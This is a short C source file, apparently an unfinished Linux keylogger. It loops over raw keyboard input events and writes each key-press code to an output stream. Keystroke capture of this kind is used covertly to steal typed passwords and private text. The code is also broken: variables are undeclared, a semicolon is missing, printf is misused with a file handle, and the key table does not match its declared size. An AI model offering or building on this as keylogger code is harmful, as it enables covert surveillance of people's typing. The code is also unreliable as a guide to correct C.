/*** keylog.c ***/

#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>

#define EVENT_NUM 100
#define TOT_KEYS 71

char *keys[] = {
  "1",
  "2",
  "3",
  "4",
  "5",
  "6",
  "7",
  "8",
  "9",
  "0"
  }

void keylogReadAndPrint(int keyboard, FILE *output)
{
  struct input_event events[EVENT_NUM];
  
  //keylogger loop
  while (1)
  {
    //not sure how this bytesRead works yet
    bytesRead = read(keyboard, events, eventSize * EVENT_NUM);
    
    for (i = 0; i < bytesRead/eventSize; ++i)
    {
      //if the type of the event is a state change (like of a keyboard)
      if (events[i].type == EV_KEY)
      {
        //if event is a keypress
        if (events[i].value == 1)
        {
          //if the event code indicates a standard keyboard button
          if (events[i].code > 0 && events[i].code < TOT_KEYS)
          {
            //output the code of the standard keyboard button
            printf(output, "%d\n", events[i].code);
          }
          else
          {
            printf(output, "Key not recognized\n");
          }
        }
      }
    }
  }
}
